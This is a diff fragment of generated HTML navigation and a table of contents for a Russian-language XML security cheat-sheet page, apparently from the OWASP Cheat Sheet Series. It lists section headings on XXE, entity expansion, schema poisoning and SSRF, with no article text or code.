+    Архитектура безопасности микросервисов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Mobile_Application_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность мобильных приложений
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Multifactor_Authentication_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Многофакторная аутентификация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Multi_Tenant_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность мультиарендных систем
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Network_Segmentation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Сегментация сети
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="NodeJS_Docker_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Node.js в Docker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Nodejs_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Node.js
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="NoSQL_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность NoSQL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="NPM_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность NPM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="OAuth2_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OAuth 2.0
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="OS_Command_Injection_Defense_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита от инъекции команд ОС
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Password_Storage_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Хранение паролей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="PHP_Configuration_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Конфигурация PHP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Pinning_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Закрепление сертификатов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Prototype_Pollution_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение Prototype Pollution
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Query_Parameterization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Параметризация запросов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="REST_Assessment_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Оценка REST
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="REST_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность REST
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Ruby_on_Rails_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ruby on Rails
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="SAML_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность SAML
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="SQL_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение SQL-инъекций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_AI_Model_Ops_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Операции с AI-моделями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_Cloud_Architecture_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасная облачная архитектура
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_Code_Review_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Анализ безопасности кода
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_Product_Design_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасное проектирование продукта
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Securing_Cascading_Style_Sheets_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность CSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Serverless_FaaS_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Serverless/FaaS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Session_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление сессиями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Software_Supply_Chain_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность цепочки поставок ПО
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Symfony_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Symfony
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secrets_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление секретами
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Third_Party_Javascript_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление сторонним JavaScript
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Third_Party_Payment_Gateway_Integration.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Интеграция платёжных шлюзов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Threat_Modeling_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Моделирование угроз
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="TLS_Cipher_String_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Строки шифров TLS (устарело)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Transaction_Authorization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Авторизация транзакций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Transport_Layer_Protection_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита транспортного уровня (устарело)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Transport_Layer_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность транспортного уровня
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Неверифицированные перенаправления
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="User_Privacy_Protection_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита конфиденциальности пользователей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Virtual_Patching_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Виртуальные патчи
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Vulnerability_Disclosure_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Раскрытие уязвимостей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Vulnerable_Dependency_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление уязвимыми зависимостями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Web_Service_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность веб-сервисов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="WebSocket_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность WebSocket
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение XXE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Безопасность XML
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="XML_Security_Cheat_Sheet.html" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность XML
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Введение
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Работа с некорректно сформированными XML-документами
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Работа с некорректно сформированными XML-документами">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xml-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Определение некорректно сформированного XML-документа
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обработка некорректно сформированных XML-документов
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Обработка некорректно сформированных XML-документов">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xml-_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректно сформированные XML-документы требуют дополнительного времени
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Приложения, обрабатывающие некорректные данные
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Приложения, обрабатывающие некорректные данные">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректный документ → некорректный документ
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Правильно сформированный документ → нормализованный правильно сформированный документ
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обработка принудительного парсинга
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Нарушение правил спецификации XML
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Работа с недопустимыми XML-документами
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Работа с недопустимыми XML-документами">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Документ без схемы
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Неограничительная схема
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректная проверка данных
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Некорректная проверка данных">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строковые типы данных
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Числовые типы данных
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Числовые типы данных">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ограничения отрицательных и положительных значений
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      Деление на ноль
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-nan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Специальные значения: бесконечность и не-число (NaN)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      Общие ограничения данных
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Общие ограничения данных">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      Перечисляемые значения
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      Диапазоны
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      Паттерны
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      Утверждения
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      Кратность вхождений
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      Сверхбольшие полезные нагрузки
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Сверхбольшие полезные нагрузки">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      Традиционные сверхбольшие полезные нагрузки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      «Маленькие» сверхбольшие полезные нагрузки
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отравление схемы
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Отравление схемы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      Локальное отравление схемы
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Локальное отравление схемы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      Встроенная схема
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректные права доступа
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удалённое отравление схемы
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Удалённое отравление схемы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mitm" class="md-nav__link">
+    <span class="md-ellipsis">
+      Атака «человек посередине» (MitM)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dns-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отравление DNS-кэша
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      Атака злонамеренного сотрудника
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Расширение XML-сущностей
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Расширение XML-сущностей">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    <span class="md-ellipsis">
+      Примеры уязвимых реализаций на Java
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Примеры уязвимых реализаций на Java">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xxe-dom" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE с использованием DOM
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-dom4j" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE с использованием DOM4J
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-sax" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE с использованием SAX
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-stax" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE с использованием StAX
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      Рекурсивная ссылка на сущность
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      Квадратичное расширение
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#billion-laughs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Billion Laughs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отражённое извлечение файлов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      Подделка запросов на стороне сервера (SSRF)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Подделка запросов на стороне сервера (SSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Внешнее разрешение DNS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      Внешнее соединение
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_32" class="md-nav__link">
+    <span class="md-ellipsis">
+      Извлечение файлов с параметрическими сущностями
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_33" class="md-nav__link">
+    <span class="md-ellipsis">
+      Сканирование портов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_34" class="md-nav__link">
+    <span class="md-ellipsis">
+      Брутфорс
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XS_Leaks_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XS Leaks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XSS_Filter_Evasion_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Обход XSS-фильтров
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Zero_Trust_Architecture_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Архитектура Zero Trust
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Введение
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Работа с некорректно сформированными XML-документами
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Работа с некорректно сформированными XML-документами">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xml-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Определение некорректно сформированного XML-документа
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обработка некорректно сформированных XML-документов
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Обработка некорректно сформированных XML-документов">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xml-_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректно сформированные XML-документы требуют дополнительного времени
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Приложения, обрабатывающие некорректные данные
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Приложения, обрабатывающие некорректные данные">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректный документ → некорректный документ
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Правильно сформированный документ → нормализованный правильно сформированный документ
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обработка принудительного парсинга
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Нарушение правил спецификации XML
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Работа с недопустимыми XML-документами
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Работа с недопустимыми XML-документами">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Документ без схемы
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Неограничительная схема
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректная проверка данных
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Некорректная проверка данных">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строковые типы данных
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Числовые типы данных
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Числовые типы данных">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ограничения отрицательных и положительных значений
+    </span>
+  </a>
+  
